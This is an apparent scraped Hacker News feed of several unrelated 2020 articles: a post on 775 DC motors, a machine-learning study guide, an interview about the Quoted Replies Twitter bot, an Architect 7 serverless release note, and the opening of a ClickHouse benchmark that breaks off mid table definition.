<p>Its dimensions are 66.7x 42 mm is the size of the outer cylinder, with a diameter of 42mm and 5 mm of shaft.</p>



<p>That shaft usually protrudes 17 mm although this already varies depending on the manufacturer.</p>



<p>As for the output shaft can buy it circular or D depending on the needs you have in your project.</p>



<p><strong>Brushless motors are more efficient</strong>, but remember that you must use a controller for its operation, while a motor with brushes with applied voltage will work.</p>



<p>They are high speed motors, which can range from 12,000 rpm to 21,000 rpm</p>



<h2><span id="Datasheet">Datasheet</span></h2>



<figure><img src="https://www.ikkaro.net/wp-content/uploads/2020/09/power-wheels-775-motor-1024x682.jpg" data-src="https://www.ikkaro.net/wp-content/uploads/2020/09/power-wheels-775-motor-1024x682.jpg" alt="775 features and datasheet" data-srcset="https://www.ikkaro.net/wp-content/uploads/2020/09/power-wheels-775-motor-1024x682.jpg 1024w, https://www.ikkaro.net/wp-content/uploads/2020/09/power-wheels-775-motor-300x200.jpg 300w, https://www.ikkaro.net/wp-content/uploads/2020/09/power-wheels-775-motor-768x512.jpg 768w, https://www.ikkaro.net/wp-content/uploads/2020/09/power-wheels-775-motor.jpg 1280w" data-sizes="(max-width: 1024px) 100vw, 1024px" srcset="https://www.ikkaro.net/wp-content/uploads/2020/09/power-wheels-775-motor-1024x682.jpg 1024w, https://www.ikkaro.net/wp-content/uploads/2020/09/power-wheels-775-motor-300x200.jpg 300w, https://www.ikkaro.net/wp-content/uploads/2020/09/power-wheels-775-motor-768x512.jpg 768w, https://www.ikkaro.net/wp-content/uploads/2020/09/power-wheels-775-motor.jpg 1280w"></figure>



<p><strong>Look for your manufacturer’s model datasheet</strong>, as there is no single datasheet for the 775 because they are different engines and each brand will have different characteristics and voltage, power, etc.</p>



<p>I leave you an example, but what you have to do is look for the datasheet of the model you have bought. There you can see not only the engine size but also its technical characteristics</p>



<p>My purchase is of the <strong>brand HANPOSE 775 motor DC 12V 24V 80W 150W 288W</strong> And as you see we can choose from 3 different powers. I have taken the largest of 288W</p>



<figure><table><tbody><tr><td>Model</td><td>775</td></tr><tr><td>Axis diameter</td><td>5mm</td></tr><tr><td>Mounting hole size</td><td>M4</td></tr><tr><td>Mounting hole</td><td>2</td></tr></tbody></table></figure>



<figure><table><tbody><tr><td>Motor Power&nbsp;(W)</td><td>Nominal Voltage&nbsp;(V)</td><td>Max current&nbsp;(A)</td><td>Max Torque&nbsp;(KG)</td><td>Max velocity&nbsp;(RPM)</td></tr><tr><td>80W</td><td>12</td></tr><tr><td>24</td><td>8000</td><td>6A</td><td>1.8</td><td>4000</td></tr><tr><td>150W</td><td>12</td></tr><tr><td>24</td><td>15000</td><td>12A</td><td>3.2</td><td>7500</td></tr><tr><td>288W</td><td>12</td></tr><tr><td>24</td><td>12000</td><td>12A</td><td>3.8</td><td>6000</td></tr></tbody></table></figure>



<p><strong>Features:</strong></p>



<ol><li>Double ball bearing design</li><li>With cooling fan.</li><li>Low noise, smooth running.</li></ol>



<h2><span id="Projects_we_can_make">Projects we can make</span></h2>



<figure><img src="https://www.ikkaro.net/wp-content/uploads/2020/09/775-dc-motor-1024x682.jpg" data-src="https://www.ikkaro.net/wp-content/uploads/2020/09/775-dc-motor-1024x682.jpg" alt="hanpose 288W 775 motor" data-srcset="https://www.ikkaro.net/wp-content/uploads/2020/09/775-dc-motor-1024x682.jpg 1024w, https://www.ikkaro.net/wp-content/uploads/2020/09/775-dc-motor-300x200.jpg 300w, https://www.ikkaro.net/wp-content/uploads/2020/09/775-dc-motor-768x512.jpg 768w, https://www.ikkaro.net/wp-content/uploads/2020/09/775-dc-motor.jpg 1280w" data-sizes="(max-width: 1024px) 100vw, 1024px" srcset="https://www.ikkaro.net/wp-content/uploads/2020/09/775-dc-motor-1024x682.jpg 1024w, https://www.ikkaro.net/wp-content/uploads/2020/09/775-dc-motor-300x200.jpg 300w, https://www.ikkaro.net/wp-content/uploads/2020/09/775-dc-motor-768x512.jpg 768w, https://www.ikkaro.net/wp-content/uploads/2020/09/775-dc-motor.jpg 1280w"></figure>



<p>If you don’t know them, you will be surprised by the amount of <strong>projects and inventions we can do with them</strong>. They are usually things that require torque and power.</p>



<p>The one I have bought for example is 288W</p>



<p>I leave a list with ideas</p>



<ul><li>Blower</li><li>Vacuum cleaner</li><li>Water pump</li><li>Drill</li><li>Karts, electric bikes, scooters and any other type of apparatus with wheels that we want to move</li><li>Saws</li></ul>



<p>There is a Youtube playlist dedicated to tools made with 775 engines and PVC pipes and it is amazing</p>



<figure><p>
<iframe title="Great Useful tool with 775 motor and PVC Pipe" width="825" height="464" src="https://www.youtube.com/embed/videoseries?list=PLU_ixO5WDlXte5hucIh01v1DWFD4kTlju" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p></figure>



<p>Another project I want to do is a mini kart </p>



<figure><p>
<iframe title="Build a Mini Electric Cycle Kart using Two 775 Motor -  Electric Car - Tutorial (Upgrade)" width="825" height="464" src="https://www.youtube.com/embed/1MIPhcCHIZY?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p></figure>



<h2><span id="What_to_look_for_if_you_are_buying_a_775">What to look for if you are buying a 775</span></h2>



<p>As you will get many models of engines look at these things</p>



<ul><li>If you have brushes or are brushless</li><li>The nominal operating voltage</li><li>The Amperes you consume</li><li>The pair</li><li>The rpm</li><li>If you have one set or 2 ball steals</li></ul>



<p>With this you have to play around and adapt the motor to what you want to get. Do you need a lot of torque like on an electric bike that has to move a lot of weight or a lot of revolutions like in a vacuum cleaner?</p>



<p>Do you have a power supply or batteries that deliver the required V and A without any problem?</p>



<p>Do you want a more efficient brushless motor, managed with a controller or is it worth something more coarse that you can control directly by modifying the voltage?</p>



<p>If you have two sets of bearings, it’s more stable<br>Where to buy them</p>



<p>Well, there are many online stores where you can buy them and the prices do not vary much. I leave you links to Amazon, ebay, Aliexpress and Bangood</p>



<p>The average price is between 8 and 13 dollars.</p>
		</div></div>]]>
            </description>
            <link>https://www.ikkaro.net/775-motor/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24519390</guid>
            <pubDate>Fri, 18 Sep 2020 17:18:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Learn Machine Learning and Deep Learning: A Guide for Software Engineers]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24519166">thread link</a>) | @renanmoura
<br/>
September 18, 2020 | https://renanmf.com/machine-learning-and-deep-learning-software-engineers/ | <a href="https://web.archive.org/web/*/https://renanmf.com/machine-learning-and-deep-learning-software-engineers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<h2>Introduction</h2>
<p>The subject of Artificial Intelligence picks my interest and I’m constantly studying and trying new things in this field.</p>
<p>It is notorious how the technologies related to Natural Language Processing, Computer Vision and such have emerged and evolved into solutions used by millions of users every day.</p>
<p>Even though people use the term "Artificial Intelligence", we are still far away from something as advanced as a Skynet from the Terminator movies.</p>
<p>The most common subfield of AI used today is the one called Machine Learning, which, in its turn, has Deep Learning as subfield steeply growing every day for quite some time now.</p>
<p>In this guide, I aim to describe a path to follow for software engineers to begin understanding how Machine Learning works and how to apply it to your projects.</p>
<p>Yeah, you can just go to Google API’s or Amazon and pick some magical API to do Speech Recognition for you, but the value of knowing how it works, why it works and even more, how to make your own API as a Service and tune it to your specific needs is incredible.</p>
<p>Remember, as a developer, every tool is a new power.</p>
<p>I’ve read, watched and gone through all these resources until the end, even got a paid certification for some, even though it is not necessary to learn, I find myself more engaged to finish when I have some deadline and assessment to prove I actually learned the material.</p>
<p>Let’s dive into the topics.</p>
<h2>The Basics: Math!</h2>
<p>Maybe you never had the chance to study some college-level math, or you did study it but you can’t remember most of the stuff because JavaScript and CSS took all the memory of those topics away.</p>
<p>There are 3 topics you must know beforehand, or at least have a decent grasp of to follow any good material on ML and DL: Linear Algebra, Calculus and Statistics.</p>
<p>If you’d like to go deep in learning the math needed to ML and DL, you can look for MIT OpenCourseWare classes like Professor Strang’s renowned <a href="https://ocw.mit.edu/courses/mathematics/18-06-linear-algebra-spring-2010/">Linear Algebra</a> class.</p>
<p>I’ve watched it in college in parallel with my regular class and it is very good.</p>
<p>But, let’s face it, most people have no time for that or the patience.</p>
<p>So I will give you the crash course for the 3 topics mentioned above.</p>
<h3>Linear Algebra</h3>
<p>Just watch the whole series <a href="https://www.youtube.com/watch?v=fNk_zzaMoSs&amp;list=PLZHQObOWTQDPD3MizzM2xVFitgF8hE_ab">Essence of Linear Algebra</a> from the Youtube channel 3Blue1Brown.</p>
<p>The guy makes visual explanations of once hard concepts incredibly easy!</p>
<p>It is very far in terms of content compared to Professor Strang’s, but it’s enough, to begin with, and you can go after other topics as you advance in ML and DL.</p>
<h3>Calculus</h3>
<p>Guess what?</p>
<p>3Blue1Brown also has a whole series on Calculus on Youtube for you to watch for free: <a href="https://www.youtube.com/watch?v=WUvTyaaNkzM&amp;list=PLZHQObOWTQDMsr9K-rj53DwVRMYO3t5Yr">Essence of Calculus</a>.</p>
<p>Again, he is very good at giving you the intuition of why and how rather than just throw some random equations on your face.</p>
<h3>Statistics</h3>
<p>This is a whole field that, in my opinion, you can learn as needed, a good reference is <a href="https://www.amazon.com/Practical-Statistics-Data-Scientists-Essential/dp/1491952962">Practical Statistics for Data Scientists: 50 Essential Concepts</a>.</p>
<p>An objective book with some good examples for every concept.</p>
<p>Fast to read too.</p>
<p>As the title implies, it is more suitable for Data Scientists, but understanding some basics of statistics is always good and this is what this is book is for.</p>
<p>You won’t become a statistician after reading it, but you will learn some good stuff.</p>
<h2>The Bypassed: Machine Learning</h2>
<p>Everybody wants to jump straight into Deep Learning and be the cool guy training a single model for a week on a 12GB GPU.</p>
<p>But to get Deep Learning right, you need to go through Machine Learning first!</p>
<h3>Start from the beginning</h3>
<p>The concepts, the train of thought, the "feeling" of how things work start here and there is no one else more capable of teaching those concepts than Professor Andrew Ng in his course <a href="https://www.coursera.org/learn/machine-learning">Machine Learning</a>.</p>
<p>You may think this course is old and outdated, well, technology-wise, maybe, but conceptually-wise, it is better than anything else out there.</p>
<p>Professor Ng makes it easy to understand the math applied in every technique he teaches and gives you a solid understanding of what happens underneath in a very short and concise course.</p>
<p>All the exercises are made in Octave, a free version of Matlab of sorts, and you finish the course implementing your own Neural Network!</p>
<p>The syntax in Octave is easy to grasp for any programmer, so don’t let that be a barrier for you.</p>
<p>Once you finish the course, you will have implemented all the major algorithms and will be able to solve several prediction problems.</p>
<h3>Random Forests</h3>
<p>I said all the major algorithms, right?</p>
<p>Actually, there is but one flaw in Andrew Ng’s course, he doesn’t cover Random Forests.</p>
<p>An awesome complement to his course is fast.ai’s <a href="http://course18.fast.ai/ml">Introduction to Machine Learning for Coders</a>.</p>
<p>Jeremy Howard goes super practical on the missing piece in Ng’s course covering a topic that is, for many classical problems, the best solution out there.</p>
<p>Fast.ai’s approach is what is called Top-Down, meaning they show you how to solve the problem and then explain why it worked, which is the total opposite of what we are used to in school.</p>
<p>Jeremy also uses real-world tools and libraries, so you learn by coding in industry-tested solutions.</p>
<h2>Deep Learning</h2>
<p>Finally!</p>
<p>The reason why we are all here, Deep Learning!</p>
<p>Again, the best resource for it is Professor Ng’s course, actually, a series of courses.</p>
<p>The <a href="https://www.deeplearning.ai/deep-learning-specialization/">Deep Learning Specialization</a> is composed of 5 courses total going from the basics and evolving on specific topics such as language, images, and time-series data.</p>
<p>One nice thing is that he continues from the very end of his classical Machine Learning course, so it just feels like an extension of the first course.</p>
<p>The math, the concepts, the notion of how and why it works, he delivers it all very concisely like few I’ve seen.</p>
<p>The only drawback is that he uses <a href="https://www.tensorflow.org/">Tensorflow</a> 1.x (Google’s DL Framework) in this course, but that’s minimal detail in my opinion since the explanations and exercises are so well delivered.</p>
<p>You can pick up the most recent version of the framework relatively easy and to do so there is the final piece of this guide, a book.</p>
<h3>Too much stuff, give me something faster</h3>
<p>This book might be the only thing you need to start, it is Aurélien Géron’s <a href="https://www.amazon.com.br/Hands-Machine-Learning-Scikit-Learn-TensorFlow-ebook/dp/B07XGF2G87">Hands-On Machine Learning with Scikit-Learn, Keras, and TensorFlow: Concepts, Tools, and Techniques to Build Intelligent Systems</a>.</p>
<p>It covers a lot, from classical Machine Learning to the most recent Deep Learning topics. Good examples and exercises using industry-grade frameworks and libraries.</p>
<p>I dare say that, if you are really in a rush, you can skip everything I said before and just go for the book.</p>
<p>You will miss a good amount of information contained on the other resources mentioned, but the practical and actionable knowledge from Géron’s book is enough to work on many ideas for your next project.</p>
<p>If you feel limited after only reading the book, go back and study the rest of the material, it will fill in the gaps you might have and give you a more solid understanding.</p>
<h2>What about Framework X or Y?</h2>
<p>"Hey, I’ve heard about PyTorch and that other framework or library X everybody talks about".</p>
<p>As a Software Engineer, you know better than anyone how fast technology evolves.</p>
<p>Don’t go crazy for that, after you learn the basics in this guide, you can easily go, for instance, on <a href="https://pytorch.org/">PyTorch</a> documentation or any other library or framework of sorts and learn how to use it in a week or two.</p>
<p>The techniques, the concepts, are all the same, it is only a matter of syntax and application or even tastes that you might have for any given tool.</p>
<h2>Conclusion</h2>
<p>To wrap it up, I want to say that, even though it might seem a lot, I tried to remove all the noise and at the end of the process, you will feel confident that you understand what is happening behind the curtains, the jargons and even be able to read some papers published in the field to keep up with the latest advances.</p>
<p>TL;DR Here is the list of resources mentioned in sequence:</p>
<ul>
<li><a href="https://www.youtube.com/watch?v=fNk_zzaMoSs&amp;list=PLZHQObOWTQDPD3MizzM2xVFitgF8hE_ab">Essence of Linear Algebra</a></li>
<li><a href="https://www.youtube.com/watch?v=WUvTyaaNkzM&amp;list=PLZHQObOWTQDMsr9K-rj53DwVRMYO3t5Yr">Essence of Calculus</a></li>
<li><a href="https://www.coursera.org/learn/machine-learning">Machine Learning</a></li>
<li><a href="http://course18.fast.ai/ml">Introduction to Machine Learning for Coders</a></li>
<li><a href="https://www.deeplearning.ai/deep-learning-specialization/">Deep Learning Specialization</a></li>
<li><a href="https://www.amazon.com.br/Hands-Machine-Learning-Scikit-Learn-TensorFlow-ebook/dp/B07XGF2G87">Hands-On Machine Learning with Scikit-Learn, Keras, and TensorFlow: Concepts, Tools, and Techniques to Build Intelligent Systems</a></li>
</ul>
</div></div>]]>
            </description>
            <link>https://renanmf.com/machine-learning-and-deep-learning-software-engineers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24519166</guid>
            <pubDate>Fri, 18 Sep 2020 16:59:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Twitter came to love my bot]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24519052">thread link</a>) | @MarlonPro
<br/>
September 18, 2020 | https://restofworld.org/2020/quoted-replies-twitter-bot/ | <a href="https://web.archive.org/web/*/https://restofworld.org/2020/quoted-replies-twitter-bot/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p><em>A few years ago, software engineer Dara Oladosu created a bot that collects all of the replies, retweets, and quotes of a tweet and sends them to users. It became Quoted Replies and earned him a </em><a href="https://www.cnn.com/2019/11/13/africa/nigerian-developer-gets-job-from-twitter-boss/index.html"><em>coveted job offer</em></a><em> from Twitter. Last month, Twitter </em><a href="https://twitter.com/Twitter/status/1260294888811347969"><em>released its own version of this feature</em></a><em> and credited Dara with </em><a href="https://twitter.com/rishair/status/1260319698865975296"><em>paving the way</em></a><em>.</em></p>



<h3><strong>It all started with a URL&nbsp;</strong></h3>



<p>I’m the kind of person who browses the internet a lot. Once in a while, I come across websites that can be improved. One can either contact the developers behind them to fix their sites, or build a browser extension that solves it on all websites. I prefer the second option.</p>



<p>The way Twitter is designed, by viewing a unique URL that references the tweet in question, you can see all the replies to that tweet. Someone on my timeline had <a href="https://twitter.com/supersanusi/status/1026407860383739905?s=20">asked for</a> recommendations, and I <a href="https://twitter.com/dara_tobi/status/1026423139956391936?s=20">replied with a unique URL</a>, so anyone interested could see all the recommendations. When I saw another tweet asking for another set of recommendations, I decided to build a fix.</p>



<p>I had just learned of Twitter’s streaming API then. This is Twitter’s way of sending you notifications when you subscribe to a person or name. Developers use the API to build “listeners,” tools that track mentions of a particular word or phrase. That’s how a lot of companies see complaints about them.</p>



<p>So I added the streaming API, plus certain keywords, the URL of the tweet, and some code in the background to make the<a href="https://chrome.google.com/webstore/detail/quoted-replies/gclkmaikpmlbiighmcliinfiahlfjfbf"> browser extension</a>. That became Quoted Replies. It is basically an unintended consequence of how Twitter was designed.&nbsp;</p>



<p>When <a href="https://technext.ng/2019/11/07/twitters-ceo-jack-dorsey-visits-cchub-as-part-of-his-nigerian-tour/">Jack Dorsey visited Lagos last year</a>, I just had to get into the event. You have to understand that I used to be a huge Twitter user, mostly between 2012 and 2017. When I finished talking about Quoted Replies, Kayvon, Twitter’s product lead, offered me <a href="https://techpoint.africa/2019/11/09/dara-oladosu-quoted-replies/">a job on the spot</a>. It is probably the best interview ever.</p>



<h3><strong>Sidestepping the spam problem&nbsp;</strong></h3>



<p>The bot initially had some issues. It used to <a href="https://twitter.com/QuotedReplies/status/1104084154889711616?s=20">tweet out some text with the URL</a> in response to a request, and this would lead to the account being shadow banned. When this happened, the URL in the tweet would not show up.&nbsp;</p>



<p>It took me six months to figure out that if I just removed the additional text and left the link, it would not spam Twitter. Twitter’s native code compresses any link, which incidentally makes each one unique. In July 2019, Quoted Replies made only 281,000 impressions, a metric that shows how many times tweets from that account were seen. But it really took off in September, thanks to the apps that my colleagues <a href="https://play.google.com/store/apps/details?id=com.hf.quotedreplies&amp;hl=en_US">Hamza Fetuga</a> and<a href="https://apps.apple.com/us/app/quoted-replies/id1476940595"> Hafeez Sagaya</a> built. In that month alone, the account had 25.9 million impressions, a 9,217% increase.</p>



<p>One thing that I wanted to do was to build in some anonymity, so in February, I rolled out a new feature for people to send a tweet to<a href="http://twitter.com/QuotedReplies"> @QuotedReplies</a> via direct messages, and the bot would reply with the link. This was a play again on another aspect of Twitter. The basic API has a limit of 2,400 tweets a day, and we were basically near that limit, but by using DMs, we can reduce the amount of tweets the bot makes and reply to people individually.&nbsp;</p>



<h3><strong>“Quoted Replies is an entertainment tool”</strong></h3>



<p>I was actually happy when Twitter released the native feature that shows retweets with comments. Everyone knew Twitter was going to develop their own feature. I did not get to work on it like I had imagined when they offered me the job. I wasn’t <a href="https://twitter.com/rishair/status/1260319408779493377">a part of that team</a> at all. I used to wake up to multiple direct messages in my personal account from people asking me what was wrong with the bot when they did not receive a reply. In a way, some responsibility has been taken off my shoulders. I still work full-time in Lagos for Andela, but I have done small, one-off projects for Twitter, like <a href="https://hideunwantedreplies.com/">hideunwantedreplies.com</a>, as a contract worker.&nbsp;</p>



<p>Building Quoted Replies changed my perception of the way products should be built if you want users; it should be super simple, and there should be a real need. When people think of user needs, they think only that the product should be a painkiller, but now I think entertainment is right up there. Quoted Replies is an entertainment tool.</p>



<p>Personally, I’m <a href="https://twitter.com/dara_tobi/status/1255105552503451648">working on a new bot</a> that blocks tweets from accounts that include trending words so that their ads show up when you’re checking out trends. It’s easy to do in code, but I’m still figuring out how to manage the API requests so that the bot doesn’t get flagged. I’ve learnt my lesson there. Maybe it could be a self-hosted package for users in the future.</p>
		</div></div>]]>
            </description>
            <link>https://restofworld.org/2020/quoted-replies-twitter-bot/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24519052</guid>
            <pubDate>Fri, 18 Sep 2020 16:49:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Serverless framework Architect 7.0 released; defaults to httpapis]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24518999">thread link</a>) | @brianleroux
<br/>
September 18, 2020 | https://blog.begin.com/architect-7-0-http-apis-and-even-better-sandbox-testing-c84df06cd443?source=collection_home---4------0----------------------- | <a href="https://web.archive.org/web/*/https://blog.begin.com/architect-7-0-http-apis-and-even-better-sandbox-testing-c84df06cd443?source=collection_home---4------0-----------------------">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><h2 id="b68f">By popular demand: API Gateway HTTP APIs are now the default in Architect serverless apps</h2><div><div><div><p><a href="https://blog.begin.com/@ryan?source=post_page-----c84df06cd443--------------------------------" rel="noopener"><img alt="Ryan Block" src="https://miro.medium.com/fit/c/96/96/2*EfV_5cNqDQE8MFejOm6FKg.png" width="48" height="48"></a></p></div></div></div><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1996/1*w8l-oRuAMOvf6ICSmVXF4w.png" width="998" height="182" srcset="https://miro.medium.com/max/552/1*w8l-oRuAMOvf6ICSmVXF4w.png 276w, https://miro.medium.com/max/1104/1*w8l-oRuAMOvf6ICSmVXF4w.png 552w, https://miro.medium.com/max/1280/1*w8l-oRuAMOvf6ICSmVXF4w.png 640w, https://miro.medium.com/max/1400/1*w8l-oRuAMOvf6ICSmVXF4w.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*w8l-oRuAMOvf6ICSmVXF4w.png?q=20"></p></div></div></div></figure><p id="5007">OpenJSF Architect now powers thousands of serverless applications all over the world. Folks continue to tell us they value its focused, direct, stable, lock-in-free approach to building blazing fast modern web apps without ever having to manage a single server.</p><p id="caa4">Today we’re extremely excited to announce Architect 7 (Chupacabra), a major step forward in building serverless web apps and APIs with AWS.</p><p id="f7da">Chupacabra now deploys AWS API Gateway v2.0 (aka <code>HTTP</code>) APIs by default, and ships with a rewrite of Architect’s local development environment, Sandbox. The new Sandbox includes full local/offline support for building with <code>HTTP</code> APIs, and an even better interface for integrating Architect into your automated testing, from <code>tape</code> to <code>jest</code> (and everything in between).</p><p id="e527">Want to give it a go? Here’s the super quickstart, no AWS credentials required:</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1200/1*oRk_AWfRGDx0MzXJTmeYNw.gif" width="600" height="338" srcset="https://miro.medium.com/max/552/1*oRk_AWfRGDx0MzXJTmeYNw.gif 276w, https://miro.medium.com/max/1104/1*oRk_AWfRGDx0MzXJTmeYNw.gif 552w, https://miro.medium.com/max/1200/1*oRk_AWfRGDx0MzXJTmeYNw.gif 600w" sizes="600px" data-old-src="https://miro.medium.com/freeze/max/60/1*oRk_AWfRGDx0MzXJTmeYNw.gif?q=20"></p></div></div></figure><p id="a9f0">First: <code>npm init @architect ./your-app-name</code> <br>Then: <code>npx arc sandbox<br></code><strong>That's it!</strong></p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1960/1*3FwfgGmDs6TR5RIpacUbYA.png" width="980" height="534" srcset="https://miro.medium.com/max/552/1*3FwfgGmDs6TR5RIpacUbYA.png 276w, https://miro.medium.com/max/1104/1*3FwfgGmDs6TR5RIpacUbYA.png 552w, https://miro.medium.com/max/1280/1*3FwfgGmDs6TR5RIpacUbYA.png 640w, https://miro.medium.com/max/1400/1*3FwfgGmDs6TR5RIpacUbYA.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*3FwfgGmDs6TR5RIpacUbYA.png?q=20"></p></div></div></div></figure><p id="8191">For most applications most of the time, we now believe <code>HTTP</code> APIs are the right way to ship a serverless app on AWS. Compared to legacy <code>REST</code> APIs, there are some compelling reasons to use (and upgrade) to <code>HTTP</code>:</p><p id="cab4">- <code>HTTP</code> APIs are designed to be lower-latency<br>- <code>HTTP</code> APIs provision and update significantly faster<br>- <code>HTTP</code> APIs are far less expensive to operate: as of this writing, they cost ≤$1.00/million requests, compared to <code>REST</code> APIs, which charge $3.50/million requests (plus data transferred)<br>- <code>HTTP</code> APIs support default stages and routes, meaning we can finally escape the dreaded API Stage Path Part Problem (e.g. <code>/staging</code> in <code><a href="https://{id}.execute-api.{region}.amazonaws.com/staging%60" rel="noopener">https://{id}.execute-api.{region}.amazonaws.com/staging</a></code>)<br>- <code>HTTP</code> APIs are where AWS is now putting the bulk of its API Gateway development effort<br>- As of September 2020, <code>HTTP</code> APIs now support authorizers (which can be implemented via <a href="https://arc.codes/primitives/macros" rel="noopener">Architect Macros</a>)</p><p id="5527">Existing Architect projects can upgrade to <code>HTTP</code> APIs with a single command; learn more in the <a href="https://arc.codes/guides/upgrade" rel="noopener">Architect upgrade guide</a>.</p><p id="3581">Architect 7 ships with a major upgrade to its local development and testing environment, <a href="https://github.com/architect/sandbox" rel="noopener">Sandbox 2.0</a>. Sandbox 2.0’s clean, unified testing interface enables granular controls for starting and stopping various local serverless services, and support for all major JS testing frameworks.</p><p id="8aa5">For example, here’s how to integrate Sandbox with two popular test libraries, <a href="https://github.com/substack/tape" rel="noopener">Tape</a> and <a href="https://jestjs.io/" rel="noopener">Jest</a>:</p><h2 id="b744">Tape</h2><pre><span id="4306">let sandbox = require('@architect/sandbox')<br>let test = require('tape)<p>test('Start the Sandbox', async t =&gt; {<br>  t.plan(1)<br>  let result = await sandbox.start()<br>  t.equal(result, 'Sandbox successfully started')<br>})</p><p>test('Tests go here', t =&gt; {<br>  // Make use of various Sandbox resources in your tests...<br>})</p><p>test('Shut down the Sandbox', async t =&gt; {<br>  t.plan(1)<br>  let result = await sandbox.end()<br>  t.equal(result, 'Sandbox successfully shut down')<br>})</p></span></pre><h2 id="ec26">Jest</h2><pre><span id="8c59">let sandbox = require('@architect/sandbox')</span><span id="261c">beforeAll(async () =&gt; {<br>  let result = await sandbox.start()<br>  expect(result).toBe('Sandbox successfully started')<br>})</span><span id="a76d">afterAll(async () =&gt; {<br>  let result = await sandbox.end()<br>  expect(result).toBe('Sandbox successfully shut down')<br>})</span><span id="f734">test('Tests go here', () =&gt; {<br>  // Make use of various Sandbox resources in your tests...<br>})</span></pre><p id="6635">Where possible, we’ve taken every possible measure to ensure a seamless upgrade to Architect 7.x from 6.x (Ogopogo) and earlier. Architect 7.x is fully backward compatible, and continues to ship API Gateway REST APIs to existing Architect projects.</p><p id="d4e0">Changes to Sandbox may require minor settings updates for local workflows, and its new testing interface does remove support for some obscure, undocumented APIs.</p><p id="4e1d">To learn more, please check out our extensive <a href="https://arc.codes/guides/upgrade" rel="noopener">Architect upgrade guide</a>.</p><p id="405a">We couldn’t do this work without the support and feedback of the Architect community, and of the folks at AWS working hard to make the future a little more serverless.</p><blockquote><p id="0890"><strong>More specifically, we’d like to give a shout out to:</strong><br>Akash Peri, Alan Tan, Khozema Ujjainwala, and the entire API Gateway team, Ali Servet Donmez, Andy Buckingham, Carter Rabasa, Fil Maj, Greg Allen, Gregor Martynus, Jordan Harband, Jory Burson, and Kris Borchers.</p></blockquote><p id="44e9">Since releasing Architect with the OpenJS Foundation, there have been over 390 releases — with many <a href="https://github.com/architect/architect/issues/new/choose" rel="noopener">more to come based on your feedback</a> and <a href="https://github.com/architect/" rel="noopener">contributions</a>.</p><p id="1c93">Oh, and don’t forget to <a href="https://architecture-as-text.slack.com/archives/C6BGT0D08/p1600199636147600" rel="noopener">join the Architect conversation in Slack</a>!</p></div></div></section></div></div>]]>
            </description>
            <link>https://blog.begin.com/architect-7-0-http-apis-and-even-better-sandbox-testing-c84df06cd443?source=collection_home---4------0-----------------------</link>
            <guid isPermaLink="false">hacker-news-small-sites-24518999</guid>
            <pubDate>Fri, 18 Sep 2020 16:46:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[ClickHouse and Redshift Face Off Again in NYC Taxi Rides Benchmark]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24518926">thread link</a>) | @krnaveen14
<br/>
September 18, 2020 | https://altinity.com/blog/clickhouse-and-redshift-face-off-again-in-nyc-taxi-rides-benchmark | <a href="https://web.archive.org/web/*/https://altinity.com/blog/clickhouse-and-redshift-face-off-again-in-nyc-taxi-rides-benchmark">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	

	<p><h2>Setup</h2>
</p><p>We start with the latest ClickHouse version 20.6.6.44 running inside Kubernetes on an Amazon m5.8large EC2 instance. This is a mid-range instance with 32 vCPUs, 128GB of RAM and EBS gp2 storage, that is priced at $1.54 per hour or $36.86 per day in AWS. EBS users also have to pay for storage $3 per terabyte per day.</p><p><h2>Data loading</h2>
</p><p>In previous benchmarks using NYC Taxi Rides datasets, users had to go through a painful and lengthy data transformation process that could take hours. Those times are gone, thanks to contributions to ClickHouse by Altinity engineers. We can use new ClickHouse capabilities in order to load data directly from S3 bucket.&nbsp;</p><p>The data is stored in 96 gzip-ed CSV files, one file per month, several hundred MBs size each:</p><div><figure><img src="https://lh5.googleusercontent.com/MSo9vJvJ5mbEVh4J6xEThcSb7E3MG54byt3KsVSutWJsBJ11Jzqhaz4u_OxQwDWeqZGkwuSXJglvX8yAk0dCHv0oSpjmYo3omH4WgZtkfhhdm2oe_E2YMFoQJyF5_PNl3DAxsVOf" alt="" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
</div><p>The total size reported by Amazon is 37.3GB:</p><div><figure>
<p>nyc_taxi_rides/data/tripdata/<br>96 Objects – 37.3 GB</p>
</figure>
</div><p>We are not going to do any transformations of the source data. Only minor tweakings of <a href="https://altinity.com/blog/2019/7/new-encodings-to-improve-clickhouse">table encodings</a> were applied:</p><div><pre><code>CREATE TABLE IF NOT EXISTS tripdata (
  pickup_date Date DEFAULT toDate(pickup_datetime) CODEC(Delta, LZ4),
  id UInt64,
  vendor_id String,
  pickup_datetime DateTime CODEC(Delta, LZ4),
  dropoff_datetime DateTime,
  passenger_count UInt8,
  trip_distance Float32,
  pickup_longitude Float32,
  pickup_latitude Float32,
